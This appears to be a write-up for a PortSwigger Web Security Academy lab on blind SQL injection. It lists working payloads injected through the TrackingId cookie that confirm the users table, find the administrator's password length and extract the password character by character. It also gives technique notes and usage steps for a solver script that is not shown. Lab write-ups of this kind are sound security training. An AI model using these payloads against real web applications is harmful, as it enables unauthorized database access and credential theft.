# Blind SQL Injection with Conditional Responses

PortSwigger Web Security Academy lab:
["Blind SQL injection with conditional responses"](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

## Summary

It is an SQL injection that does not show any response to the relevant SQL query or
the details of any database errors. Vulnerable parameter: `TrackingId` cookie.

Goal: enumerate the administrator's password, then log in as administrator.

## Manual confirmation steps (via Burp Repeater)

```sql
-- Confirm TrackingId is queried and reflected via a "Welcome back" message:
TrackingId=1AEjBxfK8Qt0WeBH' and 1=1--'      -- TRUE -> "Welcome back" shown
TrackingId=1AEjBxfK8Qt0WeBH' and 1=0--'      -- FALSE -> no "Welcome back"

-- Confirm users table exists:
TrackingId=1AEjBxfK8Qt0WeBH' and (select 'a' from users LIMIT 1)='a'--'

-- Confirm administrator user exists:
TrackingId=1AEjBxfK8Qt0WeBH' and (select username from users where username='administrator')='administrator'--'

-- Confirm password length (found to be 20):
TrackingId=1AEjBxfK8Qt0WeBH' and (select password from users where username='administrator' and LENGTH(password)>8)='administrator'--'

-- Enumerate password one character at a time:
TrackingId=1AEjBxfK8Qt0WeBH' and (select substring(password,1,1) from users where username='administrator')='a'--'
```

Manually brute-forcing this (or using Burp Community's single-threaded Intruder) is very
slow, so `blind_sqli_solver.py` automates it with a binary search over ASCII values.

## Key technique notes

- Base query appears to be: `... WHERE id = '<TrackingId>' AND (<condition>) ...`
- Using an arbitrary prefix like `x'` before `AND` fails, because `id='x'` never matches
  a real row, making the whole `AND` always false regardless of the injected condition.
- Fix: break out with `' OR (<condition>)-- -` instead of `AND`, so the result depends
  only on the injected condition, not on matching the original tracking ID.
- MySQL requires a space after `--` for it to be treated as a comment; using `-- -`
  guarantees that space survives even if trailing whitespace gets stripped somewhere
  in the request pipeline.

## Result

**Administrator password:** `52rqbjtjpa749cy0bv6s`

## Usage

1. Update `HOST` and `SESSION_COOKIE` at the top of `blind_sqli_solver.py` with fresh
   values from your browser/Burp.
2. `pip install requests --break-system-packages`
3. `python3 blind_sqli_solver.py`
